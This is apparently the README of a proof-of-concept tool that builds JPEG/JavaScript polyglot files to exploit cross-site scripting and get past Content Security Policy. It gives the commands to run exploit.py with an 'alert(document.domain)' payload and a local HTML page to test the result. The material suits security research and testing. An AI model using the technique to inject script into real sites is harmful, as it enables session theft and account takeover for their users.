# Exploiting XSS with JPEG Polyglot
## Requirement

- ImageMagick

## Usage

```sh
sudo apt install imagemagick  # in debian

git clone https://github.com/4n86rakam1/xss_injection_in_jpeg.git
cd xss_injection_in_jpeg
python3 exploit.py --payload 'alert(document.domain)' --imagesize 200x200 --output xss.js
```

## Test

1. Confirm to generate JavaScript file for exploiting XSS.
2. Change `src` attribute value in `index.html` to your output filename.

    e.g.

    ```html
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <script charset="ISO-8859-1" src="./xss.js"></script>
    </head>
    <body></body>
    </html>
    ```

3. Run HTTP Server.

    e.g.

    ```sh
    python3 -m http.server
    ```

4. open http://localhost:8000 in browser.

    ![POC](./poc.png)

tested in Google Chrome `Version 114.0.5735.106 (Official Build) (64-bit)`.

## References

- https://en.wikipedia.org/wiki/JPEG#Syntax_and_structure
- https://portswigger.net/research/bypassing-csp-using-polyglot-jpegs
- https://github.com/corkami/pics/blob/master/binary/JPG.png
